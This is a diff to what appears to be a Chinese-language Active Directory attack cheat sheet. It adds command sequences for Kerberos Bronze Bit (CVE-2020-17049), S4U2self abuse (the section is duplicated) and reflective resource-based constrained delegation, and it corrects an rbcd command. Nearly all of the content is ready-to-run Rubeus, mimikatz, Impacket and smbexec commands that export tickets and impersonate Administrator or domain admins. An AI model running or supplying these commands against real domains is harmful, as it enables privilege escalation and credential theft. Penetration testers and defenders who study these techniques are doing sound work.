@@ -292,6 +292,8 @@ Rubeus.exe purge [/user:<User>]
 Kerberos Bronze - CVE-2020-17049
 
 ```powershell
+getST.py -force-forwardable -spn "$Target_SPN" -impersonate "Administrator" -dc-ip "$DC_HOST" -hashes :"$NT_HASH" "$DOMAIN"/"$USER"
+
 getST -spn "cifs/target" -impersonate "Administrator" DOMAIN/USER:PASSWORD -force-forwardable
 
 getST -force-forwardable -spn "$Target_SPN" -impersonate "Administrator" -dc-ip "$DC_HOST" -hashes :"$NT_HASH" "$DOMAIN"/"$USER"
@@ -317,7 +319,7 @@ msDS-AllowedToActOnBehalfOfOtherIdentity
 # Windows
 addcomputer -method SAMR -dc-ip <DC IP> -computer-name <Name$> -computer-pass p <Password> DOMAIN/USER:PASSWORD
 
-rbcd -dc-ip <DC IP> -action write -delegate-to <Attck Target>$ -delegate-from <Machine Account$> DOMAIN/USER:PASSWORD
+rbcd -dc-ip <DC IP> -action write -delegate-from <ControlledAccount> -delegate-to <Attck Target>$ DOMAIN/USER:PASSWORD
 
 getST -spn "cifs/target" -impersonate "Administrator" DOMAIN/USER:PASSWORD
 
@@ -417,6 +419,60 @@ KRB5CCNAME='TGT.ccache' getST.py -u2u -impersonate "Administrator" -spn "host/ta
 
 # The password can then be reset to its old value (or another one if the domain policy forbids it, which is usually the case)
 smbpasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash 'domain'/'controlledaccountwithoutSPN'@'DomainController'
+```
+
+## S4U2self Abuse
+
+```powershell
+# 前提条件
+mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
+
+# Windows
+Rubeus.exe tgtdeleg /nowrap
+Rubeus.exe asktgt /nowrap /domain:"domain" /user:"computer$" /rc4:"NThash"
+Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /altservice:"cifs/machine.domain.local" /ticket:"base64ticket" 
+
+# Linux 
+getTGT.py -dc-ip "$DC_IP" -hashes :"$NT_HASH" "$DOMAIN"/"machine$"
+export KRB5CCNAME="/path/to/ticket.ccache"
+getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'machine$'
+```
+
+## S4U2self Abuse
+
+```powershell
+# Windows
+# Machine account's TGT
+Rubeus.exe tgtdeleg /nowrap /target:<SPN>
+Rubeus.exe asktgt /nowrap /domain:"domain" /user:"computer$" /rc4:"NThash"
+
+# Obtain a Service Ticket
+Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /altservice:"cifs/machine.domain.local" /ticket:"base64ticket"
+
+# Linux
+# Machine account's TGT
+getTGT.py -dc-ip "$DC_IP" -hashes :"$NT_HASH" "$DOMAIN"/"machine$"
+
+# Obtain a Service Ticket
+export KRB5CCNAME="/path/to/ticket.ccache"
+getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'machine$'
+```
+
+## Empowering Active Directory Objects and Reflective Resource-Based Constrained Delegation
+
+如果拥有计算机账户的凭据，甚至只是一个TGT，就可以从该账户配置基于资源的受限委派（反射RBCD），然后使用S4U2Self和S4U2Proxy为任意用户获取其TGS
+
+```powershell
+Rubeus.exe asktgt /nowrap /domain:<Domain> /user:<Machine Account$> [/rc4:<NTHash> | /aes256:<NTHash>] [/ptt]
+Rubeus.exe ptt /ticket:<Base64 Ticket>
+
+Import-Module .\Microsoft.ActiveDirectory.Management.dll
+Set-ADComputer <Machine Account> -PrincipalsAllowedToDelegateToAccount <Machine Account$>
+Get-ADComputer <Machine Account> -Properties PrincipalsAllowedToDelegateToAccount
+
+Rubeus.exe s4u /nowrap /domain:<Domain> /user:<Machine Account$> [/rc4:<NTHash> | /aes256:<NTHash>] /msdsspn:cifs/<Machine Account SPN> /impersonateuser:Administrator [/ptt] [/outfile:<name>.kirbi]
+
+smbexec -k -no-pass <Machine Account>
 ```
 
 ## 附录
